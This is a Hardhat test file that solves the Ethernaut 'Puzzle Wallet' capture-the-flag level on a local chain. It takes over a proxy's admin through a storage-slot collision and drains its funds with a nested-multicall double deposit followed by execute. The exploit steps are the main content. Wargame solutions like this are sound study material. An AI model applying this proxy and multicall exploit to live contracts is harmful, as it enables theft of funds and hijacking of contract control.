import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {PuzzleProxy, PuzzleWallet} from '../../types/typechain';

describe('Ethernaut 24: Puzzle Wallet', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let wallet: PuzzleWallet;
  let contract: PuzzleWallet; // via proxy
  let proxy: PuzzleProxy;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    // deploy wallet logic first
    wallet = await ethers.getContractFactory('PuzzleWallet', owner).then(f => f.deploy());
    await wallet.deployed();

    // deploy proxy
    proxy = await ethers
      .getContractFactory('PuzzleProxy', owner)
      .then(f =>
        f.deploy(
          owner.address,
          wallet.address,
          wallet.interface.encodeFunctionData('init', [ethers.utils.parseEther('0.1').toString()])
        )
      );
    await proxy.deployed();

    // attach to proxy
    contract = await ethers.getContractFactory('PuzzleWallet', owner).then(f => f.attach(proxy.address));
    await contract.addToWhitelist(owner.address);
    await contract.deposit({value: ethers.utils.parseEther('0.01')});

    expect(await proxy.admin()).to.eq(owner.address);
    expect(await ethers.provider.getBalance(contract.address)).to.not.eq(0);
  });

  it('should become the admin of proxy', async () => {
    // become the owner
    await proxy.connect(attacker).proposeNewAdmin(attacker.address);
    expect(await contract.owner()).to.eq(attacker.address);

    // whitelist yourself
    await contract.connect(attacker).addToWhitelist(attacker.address);
    expect(await contract.whitelisted(attacker.address)).to.be.true;

    // we will now make our multicall
    // to prepare, we need the interface
    const balance = await ethers.provider.getBalance(contract.address);
    await contract.multicall(
      [
        // first deposit
        contract.interface.encodeFunctionData('deposit'),
        // multicall for the second deposit
        contract.interface.encodeFunctionData('multicall', [
          // second deposit
          [contract.interface.encodeFunctionData('deposit')],
        ]),
        // withdraw via execute
        contract.interface.encodeFunctionData('execute', [attacker.address, balance.mul(2), []]),
      ],
      {value: balance}
    );

    // for the final step, we will call setMaxBalance with our address casted to uint256
    await contract.setMaxBalance(ethers.utils.hexZeroPad(attacker.address, 32));
  });

  after(async () => {
    expect(await ethers.provider.getBalance(contract.address)).to.eq(0);
    expect(await proxy.admin()).to.eq(attacker.address);
  });
});
